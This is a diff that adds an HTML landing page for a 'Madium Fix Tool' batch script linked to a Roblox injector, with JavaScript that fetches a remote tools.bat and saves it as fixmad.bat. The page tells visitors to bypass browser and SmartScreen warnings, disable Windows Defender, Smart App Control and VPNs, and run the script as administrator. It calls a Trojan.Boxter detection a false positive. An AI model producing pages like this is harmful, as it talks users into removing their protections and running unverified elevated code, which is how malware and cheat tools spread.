@@ -1,0 +1,923 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Madium Fix Tool</title>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg:      #080B08;
+      --surface: #0D110D;
+      --card:    #111611;
+      --border:  #1A2A1A;
+      --green:   #00FF41;
+      --green2:  #39FF14;
+      --dim:     #00CC33;
+      --text:    #E8FFE8;
+      --muted:   #5A7A5A;
+      --warn:    #FFD700;
+      --red:     #FF3333;
+    }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Inter', sans-serif;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    /* Scanlines */
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background: repeating-linear-gradient(
+        0deg,
+        transparent,
+        transparent 2px,
+        rgba(0,255,65,.012) 2px,
+        rgba(0,255,65,.012) 4px
+      );
+      pointer-events: none;
+      z-index: 999;
+    }
+
+    /* Grid */
+    body::after {
+      content: '';
+      position: fixed; inset: 0;
+      background-image:
+        linear-gradient(rgba(0,255,65,.04) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,255,65,.04) 1px, transparent 1px);
+      background-size: 40px 40px;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    /* ── NAV ── */
+    nav {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 16px 40px;
+      background: rgba(8,11,8,.92);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--border);
+    }
+
+    .nav-logo {
+      font-family: 'JetBrains Mono', monospace;
+      font-weight: 700;
+      font-size: 18px;
+      color: var(--green);
+      letter-spacing: 2px;
+      text-transform: uppercase;
+    }
+
+    .nav-logo span { color: var(--muted); }
+
+    .nav-badge {
+      display: flex; align-items: center; gap: 8px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--green);
+      border: 1px solid rgba(0,255,65,.25);
+      border-radius: 4px;
+      padding: 5px 12px;
+      background: rgba(0,255,65,.04);
+    }
+
+    .blink { animation: blink 1.2s step-end infinite; }
+    @keyframes blink { 50% { opacity: 0; } }
+
+    /* ── HERO ── */
+    .hero {
+      position: relative; z-index: 1;
+      min-height: 100vh;
+      display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+      text-align: center;
+      padding: 120px 24px 80px;
+    }
+
+    .hero-glow {
+      position: absolute;
+      width: 700px; height: 500px;
+      background: radial-gradient(ellipse, rgba(0,255,65,.08) 0%, transparent 70%);
+      top: 40%; left: 50%;
+      transform: translate(-50%, -50%);
+      pointer-events: none;
+    }
+
+    .terminal-prefix {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      color: var(--dim);
+      letter-spacing: 1px;
+      margin-bottom: 24px;
+    }
+
+    .terminal-prefix span { color: var(--green); }
+
+    .hero h1 {
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: clamp(48px, 10vw, 96px);
+      font-weight: 800;
+      line-height: .95;
+      letter-spacing: -3px;
+      color: var(--green);
+      text-shadow: 0 0 40px rgba(0,255,65,.3);
+      margin-bottom: 8px;
+    }
+
+    .hero h1 em {
+      font-style: normal;
+      color: var(--text);
+    }
+
+    .hero-sub {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 14px;
+      color: var(--muted);
+      margin: 20px 0 48px;
+      line-height: 1.8;
+    }
+
+    .hero-sub b { color: var(--green); font-weight: 500; }
+
+    /* ── TERMINAL BOX ── */
+    .terminal {
+      background: #050805;
+      border: 1px solid rgba(0,255,65,.2);
+      border-radius: 10px;
+      width: 100%; max-width: 560px;
+      margin-bottom: 48px;
+      overflow: hidden;
+      text-align: left;
+      box-shadow: 0 0 40px rgba(0,255,65,.08);
+    }
+
+    .terminal-bar {
+      background: #0D110D;
+      border-bottom: 1px solid rgba(0,255,65,.12);
+      padding: 10px 16px;
+      display: flex; align-items: center; gap: 8px;
+    }
+
+    .t-dot { width: 10px; height: 10px; border-radius: 50%; }
+    .t-red    { background: #FF5F56; }
+    .t-yellow { background: #FFBD2E; }
+    .t-green  { background: #27C93F; }
+
+    .terminal-title {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--muted);
+      margin-left: 8px;
+    }
+
+    .terminal-body {
+      padding: 20px 24px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      line-height: 2;
+    }
+
+    .t-line { display: flex; gap: 16px; }
+    .t-num  { color: var(--muted); min-width: 20px; }
+    .t-g    { color: var(--green); }
+    .t-w    { color: var(--warn); }
+    .t-d    { color: var(--muted); }
+    .t-r    { color: var(--red); }
+
+    /* ── CTA ── */
+    .cta-group {
+      display: flex; gap: 14px; flex-wrap: wrap; justify-content: center;
+    }
+
+    .btn-primary {
+      display: inline-flex; align-items: center; gap: 10px;
+      padding: 14px 32px;
+      background: var(--green);
+      color: #050805;
+      border: none;
+      border-radius: 6px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer;
+      text-decoration: none;
+      transition: box-shadow .2s, transform .15s;
+      box-shadow: 0 0 20px rgba(0,255,65,.3);
+      letter-spacing: .5px;
+    }
+
+    .btn-primary:hover {
+      box-shadow: 0 0 40px rgba(0,255,65,.55);
+      transform: translateY(-2px);
+    }
+
+    .btn-secondary {
+      display: inline-flex; align-items: center; gap: 10px;
+      padding: 14px 32px;
+      background: transparent;
+      color: var(--green);
+      border: 1px solid rgba(0,255,65,.35);
+      border-radius: 6px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      text-decoration: none;
+      transition: border-color .2s, background .2s, transform .15s;
+      letter-spacing: .5px;
+    }
+
+    .btn-secondary:hover {
+      border-color: var(--green);
+      background: rgba(0,255,65,.06);
+      transform: translateY(-2px);
+    }
+
+    hr.divider {
+      border: none;
+      border-top: 1px solid var(--border);
+      position: relative; z-index: 1;
+      margin: 0 40px;
+    }
+
+    /* ── SECTIONS ── */
+    section {
+      position: relative; z-index: 1;
+      padding: 80px 24px;
+      max-width: 1060px;
+      margin: 0 auto;
+    }
+
+    .sec-label {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      letter-spacing: 2px;
+      color: var(--dim);
+      text-transform: uppercase;
+      margin-bottom: 10px;
+    }
+
+    .sec-title {
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: clamp(26px, 4vw, 40px);
+      font-weight: 800;
+      letter-spacing: -1.5px;
+      color: var(--text);
+      margin-bottom: 40px;
+      line-height: 1.1;
+    }
+
+    .sec-title span { color: var(--green); }
+
+    /* ── OPTIONS GRID ── */
+    .options-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 16px;
+    }
+
+    .opt-card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 24px;
+      transition: border-color .2s, transform .2s, box-shadow .2s;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .opt-card::before {
+      content: '';
+      position: absolute; top: 0; left: 0; right: 0;
+      height: 2px;
+      background: var(--green);
+      transform: scaleX(0);
+      transform-origin: left;
+      transition: transform .3s;
+    }
+
+    .opt-card:hover::before { transform: scaleX(1); }
+
+    .opt-card:hover {
+      border-color: rgba(0,255,65,.3);
+      transform: translateY(-3px);
+      box-shadow: 0 8px 32px rgba(0,255,65,.06);
+    }
+
+    .opt-num {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--green);
+      letter-spacing: 1px;
+      margin-bottom: 12px;
+      opacity: .7;
+    }
+
+    .opt-card h3 {
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: 16px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      color: var(--text);
+    }
+
+    .opt-card p {
+      font-size: 13px;
+      color: var(--muted);
+      line-height: 1.6;
+    }
+
+    .opt-tag {
+      display: inline-block;
+      margin-top: 12px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 10px;
+      padding: 3px 8px;
+      border-radius: 3px;
+      letter-spacing: .5px;
+    }
+
+    .tag-stable { background: rgba(0,255,65,.1); color: var(--green); border: 1px solid rgba(0,255,65,.2); }
+    .tag-beta   { background: rgba(255,215,0,.08); color: var(--warn); border: 1px solid rgba(255,215,0,.2); }
+
+    /* ── HOW TO USE ── */
+    .steps {
+      display: flex;
+      flex-direction: column;
+      gap: 0;
+    }
+
+    .step {
+      display: flex; gap: 24px; align-items: flex-start;
+      padding: 24px 0;
+      border-bottom: 1px solid var(--border);
+    }
+    .step:last-child { border-bottom: none; }
+
+    .step-num {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      color: var(--green);
+      min-width: 32px;
+      padding-top: 2px;
+      opacity: .7;
+    }
+
+    .step-content h4 {
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: 16px;
+      font-weight: 700;
+      margin-bottom: 6px;
+    }
+
+    .step-content p {
+      font-size: 14px;
+      color: var(--muted);
+      line-height: 1.6;
+    }
+
+    .step-content code {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+      background: rgba(0,255,65,.08);
+      color: var(--green);
+      padding: 2px 8px;
+      border-radius: 4px;
+      border: 1px solid rgba(0,255,65,.15);
+    }
+
+    /* ── WARNING BANNER ── */
+    .warn-banner {
+      background: rgba(255,215,0,.05);
+      border: 1px solid rgba(255,215,0,.2);
+      border-radius: 8px;
+      padding: 16px 20px;
+      display: flex; gap: 14px; align-items: flex-start;
+      margin-bottom: 40px;
+      font-size: 13px;
+      color: #C8A800;
+      line-height: 1.6;
+    }
+
+    .warn-icon { font-size: 18px; flex-shrink: 0; margin-top: 1px; }
+
+    /* ── DOWNLOAD CTA ── */
+    .dl-box {
+      background: var(--card);
+      border: 1px solid rgba(0,255,65,.2);
+      border-radius: 12px;
+      padding: 48px;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .dl-box::before {
+      content: '';
+      position: absolute; inset: 0;
+      background: radial-gradient(ellipse at center, rgba(0,255,65,.05) 0%, transparent 70%);
+    }
+
+    .dl-box h2 {
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: 36px;
+      font-weight: 800;
+      letter-spacing: -1.5px;
+      color: var(--green);
+      margin-bottom: 12px;
+      position: relative;
+    }
+
+    .dl-box p {
+      color: var(--muted);
+      margin-bottom: 32px;
+      font-size: 14px;
+      position: relative;
+    }
+
+    /* ── FOOTER ── */
+    footer {
+      position: relative; z-index: 1;
+      text-align: center;
+      padding: 32px 24px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--muted);
+      border-top: 1px solid var(--border);
+    }
+
+    @media (max-width: 600px) {
+      nav { padding: 14px 20px; }
+      .dl-box { padding: 32px 24px; }
+    }
+
+    /* ── DISCLAIMER BANNER ── */
+    .disclaimer {
+      position: relative; z-index: 1;
+      background: rgba(255,215,0,.04);
+      border-top: 1px solid rgba(255,215,0,.15);
+      border-bottom: 1px solid rgba(255,215,0,.15);
+      padding: 10px 40px;
+      text-align: center;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: #8A7000;
+      letter-spacing: .5px;
+    }
+
+    /* ── MODAL ── */
+    .modal-overlay {
+      display: none;
+      position: fixed; inset: 0; z-index: 500;
+      background: rgba(0,0,0,.75);
+      backdrop-filter: blur(6px);
+      align-items: center; justify-content: center;
+      padding: 24px;
+    }
+    .modal-overlay.active { display: flex; }
+
+    .modal {
+      background: #0D110D;
+      border: 1px solid rgba(0,255,65,.25);
+      border-radius: 12px;
+      max-width: 600px; width: 100%;
+      overflow: hidden;
+      box-shadow: 0 0 60px rgba(0,255,65,.1);
+    }
+
+    .modal-header {
+      background: #111611;
+      border-bottom: 1px solid var(--border);
+      padding: 16px 24px;
+      display: flex; align-items: center; justify-content: space-between;
+    }
+
+    .modal-header h3 {
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: 16px;
+      font-weight: 700;
+      color: var(--warn);
+    }
+
+    .modal-close {
+      background: none; border: none; color: var(--muted);
+      font-size: 20px; cursor: pointer; line-height: 1;
+      transition: color .2s;
+    }
+    .modal-close:hover { color: var(--text); }
+
+    .modal-body { padding: 24px; }
+
+    .modal-body p {
+      font-size: 13px;
+      color: var(--muted);
+      line-height: 1.7;
+      margin-bottom: 20px;
+    }
+
+    .browser-steps { display: flex; flex-direction: column; gap: 14px; margin-bottom: 24px; }
+
+    .browser-block {
+      background: #080B08;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 14px 18px;
+    }
+
+    .browser-block h4 {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+      font-weight: 700;
+      color: var(--green);
+      margin-bottom: 8px;
+      letter-spacing: .5px;
+    }
+
+    .browser-block ol {
+      padding-left: 16px;
+      font-size: 12px;
+      color: var(--muted);
+      line-height: 2;
+    }
+
+    .browser-block code {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      background: rgba(0,255,65,.08);
+      color: var(--green);
+      padding: 1px 6px;
+      border-radius: 3px;
+    }
+
+    .modal-footer {
+      padding: 16px 24px;
+      border-top: 1px solid var(--border);
+      display: flex; gap: 12px; flex-wrap: wrap;
+    }
+
+    /* ── FALSE POSITIVE SECTION ── */
+    .fp-card {
+      background: var(--card);
+      border: 1px solid rgba(255,51,51,.2);
+      border-radius: 10px;
+      padding: 28px;
+      margin-bottom: 28px;
+    }
+
+    .fp-card h3 {
+      font-family: 'Space Grotesk', sans-serif;
+      font-size: 18px;
+      font-weight: 700;
+      color: var(--red);
+      margin-bottom: 12px;
+    }
+
+    .fp-card p {
+      font-size: 14px;
+      color: var(--muted);
+      line-height: 1.8;
+      margin-bottom: 10px;
+    }
+
+    .fp-card p:last-child { margin-bottom: 0; }
+
+    .fp-card b { color: var(--text); font-weight: 600; }
+
+    .vt-btn {
+      display: inline-flex; align-items: center; gap: 8px;
+      margin-top: 16px;
+      padding: 10px 20px;
+      background: rgba(255,51,51,.08);
+      border: 1px solid rgba(255,51,51,.25);
+      border-radius: 6px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+      color: #FF6666;
+      text-decoration: none;
+      transition: background .2s, border-color .2s;
+    }
+    .vt-btn:hover { background: rgba(255,51,51,.15); border-color: rgba(255,51,51,.4); }
+
+    /* ── MADE WITH ── */
+    .made-with {
+      position: relative; z-index: 1;
+      text-align: center;
+      padding: 28px 24px;
+      border-top: 1px solid var(--border);
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      color: var(--muted);
+    }
+
+    .made-with b {
+      color: var(--green);
+      font-style: italic;
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      *, *::before, *::after { animation: none !important; transition: none !important; }
+    }
+  </style>
+</head>
+<body>
+
+<nav>
+  <div class="nav-logo">MADIUM<span>_FIX</span></div>
+  <div class="nav-badge"><span class="blink">█</span> V1.5.9 · READY</div>
+</nav>
+
+<!-- DISCLAIMER -->
+<div class="disclaimer">
+  ⚠ &nbsp; This is an <strong style="color:#B8960A">unofficial community tool</strong> — not affiliated with, endorsed by, or related to the official Madium project or its developers.
+</div>
+
+<!-- DOWNLOAD MODAL -->
+<div class="modal-overlay" id="dlModal">
+  <div class="modal">
+    <div class="modal-header">
+      <h3>⚠ Before you download</h3>
+      <button class="modal-close" onclick="document.getElementById('dlModal').classList.remove('active')">✕</button>
+    </div>
+    <div class="modal-body">
+      <p>
+        <code style="font-family:'JetBrains Mono',monospace;font-size:12px;background:rgba(0,255,65,.08);color:#00FF41;padding:2px 8px;border-radius:3px;">.bat</code> files are blocked by default in <strong style="color:#E8FFE8">Chrome and Edge</strong> because browsers treat them as potentially dangerous. Here's how to allow the download in each browser.
+      </p>
+
+      <div class="browser-steps">
+        <div class="browser-block">
+          <h4>// GOOGLE CHROME</h4>
+          <ol>
+            <li>Click the download — Chrome will block it and show a warning in the bottom bar.</li>
+            <li>Click the <code>^</code> arrow next to the blocked file.</li>
+            <li>Select <code>Keep anyway</code> → the file downloads.</li>
+            <li>If Chrome shows "This type of file can harm your computer" — click <code>Keep</code>.</li>
+          </ol>
+        </div>
+        <div class="browser-block">
+          <h4>// MICROSOFT EDGE</h4>
+          <ol>
+            <li>Click the download — Edge will show a "This file might harm your device" warning.</li>
+            <li>Click the <code>...</code> (three dots) next to the warning.</li>
+            <li>Select <code>Keep</code> → then <code>Keep anyway</code> on the confirmation.</li>
+            <li>The file will appear in your Downloads folder.</li>
+          </ol>
+        </div>
+        <div class="browser-block">
+          <h4>// WINDOWS SMARTSCREEN (after download)</h4>
+          <ol>
+            <li>When you double-click the .bat, Windows may block it with a blue screen.</li>
+            <li>Click <code>More info</code> → then <code>Run anyway</code>.</li>
+            <li>This is normal for any unsigned script — the file is safe.</li>
+          </ol>
+        </div>
+      </div>
+
+      <p style="font-size:12px;">
+        These warnings appear because the file is unsigned, not because it's malicious. You can verify the file yourself on VirusTotal using the link on this page.
+      </p>
+    </div>
+    <div class="modal-footer">
+      <button onclick="forceDl()" class="btn-primary" style="font-size:13px;padding:12px 28px;">
+        ⬇ Download anyway
+      </button>
+      <button class="btn-secondary" style="font-size:13px;padding:12px 20px;"
+        onclick="document.getElementById('dlModal').classList.remove('active')">
+        Cancel
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-glow"></div>
+
+  <div class="terminal-prefix">
+    C:\Users\You&gt; <span>./fixmad.bat</span>
+  </div>
+
+  <h1>Madium<br><em>Fix Tool</em></h1>
+
+  <p class="hero-sub">
+    One script. Every problem solved.<br>
+    <b>Fix · Install · Repair · Update</b>
+  </p>
+
+  <!-- Terminal preview -->
+  <div class="terminal">
+    <div class="terminal-bar">
+      <div class="t-dot t-red"></div>
+      <div class="t-dot t-yellow"></div>
+      <div class="t-dot t-green"></div>
+      <span class="terminal-title">Madium Fix Tool — cmd.exe</span>
+    </div>
+    <div class="terminal-body">
+      <div class="t-line"><span class="t-d t-num">1</span><span class="t-d">================================================</span></div>
+      <div class="t-line"><span class="t-d t-num">2</span><span class="t-g">MADIUM FIX TOOL</span></div>
+      <div class="t-line"><span class="t-d t-num">3</span><span class="t-d">================================================</span></div>
+      <div class="t-line"><span class="t-d t-num">4</span><span class="t-g">[1]</span><span class="t-d"> FIX MADIUM</span></div>
+      <div class="t-line"><span class="t-d t-num">5</span><span class="t-g">[2]</span><span class="t-d"> Install Madium Latest Version</span></div>
+      <div class="t-line"><span class="t-d t-num">6</span><span class="t-g">[3]</span><span class="t-d"> Fix crashing issue </span><span class="t-w">(beta)</span></div>
+      <div class="t-line"><span class="t-d t-num">7</span><span class="t-g">[4]</span><span class="t-d"> Install Bytebreaker</span></div>
+      <div class="t-line"><span class="t-d t-num">8</span><span class="t-g">[5]</span><span class="t-d"> Error Manifest response was empty fix</span></div>
+      <div class="t-line"><span class="t-d t-num">9</span><span class="t-r">[6]</span><span class="t-d"> Exit</span></div>
+      <div class="t-line" style="margin-top:4px"><span class="t-d t-num"> </span><span class="t-g">Select an option (1-6): <span class="blink">_</span></span></div>
+    </div>
+  </div>
+
+  <div class="cta-group">
+    <button onclick="document.getElementById('dlModal').classList.add('active')" class="btn-primary">⬇ Download .bat</button>
+    <a href="#how-to" class="btn-secondary">How to use</a>
+  </div>
+</div>
+
+<hr class="divider" />
+
+<!-- OPTIONS -->
+<section>
+  <div class="sec-label">// what it does</div>
+  <div class="sec-title">Every fix. <span>One tool.</span></div>
+
+  <div class="options-grid">
+
+    <div class="opt-card">
+      <div class="opt-num">OPTION 01</div>
+      <h3>Fix Madium</h3>
+      <p>Kills all Madium processes, wipes the old installation folder, then downloads and reinstalls a clean copy automatically.</p>
+      <span class="opt-tag tag-stable">STABLE</span>
+    </div>
+
+    <div class="opt-card">
+      <div class="opt-num">OPTION 02</div>
+      <h3>Install Latest Version</h3>
+      <p>Skips the cleanup and goes straight to downloading the Madium Bootstrapper to get you on the newest release.</p>
+      <span class="opt-tag tag-stable">STABLE</span>
+    </div>
+
+    <div class="opt-card">
+      <div class="opt-num">OPTION 03</div>
+      <h3>Fix Crashing Issue</h3>
+      <p>Removes and reinstalls your entire Roblox folder. Double-confirmation required. Useful when Madium keeps crashing on inject.</p>
+      <span class="opt-tag tag-beta">BETA</span>
+    </div>
+
+    <div class="opt-card">
+      <div class="opt-num">OPTION 04</div>
+      <h3>Install Bytebreaker</h3>
+      <p>Downloads and extracts Bytebreaker V1 directly to your Desktop, then launches it automatically.</p>
+      <span class="opt-tag tag-stable">STABLE</span>
+    </div>
+
+    <div class="opt-card">
+      <div class="opt-num">OPTION 05</div>
+      <h3>Fix "Manifest Empty" Error</h3>
+      <p>Manually downloads all Madium files (Loader, Madium.exe, .dll, luau-lsp) and places them in the correct folders. Creates a Desktop shortcut.</p>
+      <span class="opt-tag tag-stable">STABLE</span>
+    </div>
+
+    <div class="opt-card">
+      <div class="opt-num">OPTION 06</div>
+      <h3>Exit</h3>
+      <p>Closes the tool cleanly. No changes made if you exit without running any option.</p>
+      <span class="opt-tag tag-stable">SAFE</span>
+    </div>
+
+  </div>
+</section>
+
+<hr class="divider" />
+
+<!-- HOW TO USE -->
+<section id="how-to">
+  <div class="sec-label">// usage guide</div>
+  <div class="sec-title">How to <span>run it.</span></div>
+
+  <div class="warn-banner">
+    <span class="warn-icon">⚠</span>
+    <div>
+      Before running: <strong>disable Windows Defender, Smart App Control, and any VPN.</strong>
+      The tool will ask you to confirm this before proceeding. The script needs admin rights — it will prompt you automatically.
+    </div>
+  </div>
+
+  <div class="steps">
+    <div class="step">
+      <span class="step-num">01</span>
+      <div class="step-content">
+        <h4>Download the .bat file</h4>
+        <p>Click the download button below and save <code>fixmad.bat</code> anywhere on your PC.</p>
+      </div>
+    </div>
+    <div class="step">
+      <span class="step-num">02</span>
+      <div class="step-content">
+        <h4>Disable antivirus & VPN</h4>
+        <p>Turn off Windows Defender, Smart App Control, and any active VPN. The script downloads executables — AV will block them.</p>
+      </div>
+    </div>
+    <div class="step">
+      <span class="step-num">03</span>
+      <div class="step-content">
+        <h4>Run as Administrator</h4>
+        <p>Right-click <code>fixmad.bat</code> → <code>Run as administrator</code>. The script will auto-elevate if needed.</p>
+      </div>
+    </div>
+    <div class="step">
+      <span class="step-num">04</span>
+      <div class="step-content">
+        <h4>Pick an option</h4>
+        <p>Type <code>1</code> through <code>5</code> to select what you want to fix. For most issues, start with option <code>1</code> (Fix Madium).</p>
+      </div>
+    </div>
+    <div class="step">
+      <span class="step-num">05</span>
+      <div class="step-content">
+        <h4>Done</h4>
+        <p>A shortcut is created on your Desktop automatically. Launch Madium and inject as normal.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<hr class="divider" />
+
+<!-- FALSE POSITIVE EXPLANATION -->
+<section id="why-flagged">
+  <div class="sec-label">// why antivirus flags it</div>
+  <div class="sec-title">Trojan.Boxter — <span>false positive.</span></div>
+
+  <div class="fp-card">
+    <h3>Why does antivirus say "Trojan.Boxter"?</h3>
+    <p>
+      This is a <b>false positive</b> — a mistake made by antivirus engines, not evidence of actual malware.
+      <code style="font-family:'JetBrains Mono',monospace;font-size:12px;background:rgba(255,51,51,.08);color:#FF6666;padding:1px 6px;border-radius:3px;">Trojan.Boxter</code> is a generic, heuristic detection label used when a file matches a behavioral pattern, not an actual known virus signature.
+    </p>
+    <p>
+      This .bat file does several things that <b>look suspicious to automated scanners</b>: it requests admin rights, uses PowerShell commands, kills processes with <code style="font-family:'JetBrains Mono',monospace;font-size:12px;background:rgba(0,255,65,.08);color:#00FF41;padding:1px 6px;border-radius:3px;">taskkill</code>, deletes folders, and downloads .exe files from the internet. Each of those actions individually is normal. Together in a batch script, heuristic engines flag it because <b>malware does the same things</b>.
+    </p>
+    <p>
+      The difference is intent. This tool does those things to <b>clean and reinstall Madium</b>, not to harm your system. The source code is fully readable — open the .bat in Notepad and you can verify every single line yourself before running it.
+    </p>
+    <p>
+      You can also check the file hash on VirusTotal. Most engines will clear it — only generic heuristic detectors flag it, and they do so because of the script's behavior, not because it contains any actual malicious payload.
+    </p>
+    <a href="https://www.virustotal.com/gui/file/b7ae5158e9ce34a1468e6390fb7e490b135e32b6ac0d5dee493fd9c534a40367" target="_blank" class="vt-btn">
+      🔍 View on VirusTotal
+    </a>
+  </div>
+</section>
+
+<hr class="divider" />
+
+<!-- DOWNLOAD -->
+<section id="download" style="padding-bottom: 100px;">
+  <div class="dl-box">
+    <h2>Download fixmad.bat</h2>
+    <p>Free. Readable source. Verify it yourself.</p>
+    <button onclick="document.getElementById('dlModal').classList.add('active')"
+       class="btn-primary" style="font-size:16px; padding:16px 48px;">
+      ⬇ Download Now
+    </button>
+
+  <script>
+    async function forceDl() {
+      const url = 'https://raw.githubusercontent.com/LINUS91022/fix/main/tools.bat';
+      try {
+        const res = await fetch(url);
+        const blob = await res.blob();
+        const a = document.createElement('a');
+        a.href = URL.createObjectURL(blob);
+        a.download = 'fixmad.bat';
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+        URL.revokeObjectURL(a.href);
+      } catch(e) {
+        // fallback: open raw link directly
+        window.open(url, '_blank');
+      }
+    }
+  </script>
+  </div>
+</section>
+
+<footer>
+  MADIUM FIX TOOL · Not affiliated with Roblox Corporation · Not affiliated with Madium · Use at your own risk
+</footer>
+
+<div class="made-with">
+  Yes, this was fucking made with my babe : <b>Claude</b> 🤍
+</div>
+
+</body>
+</html>
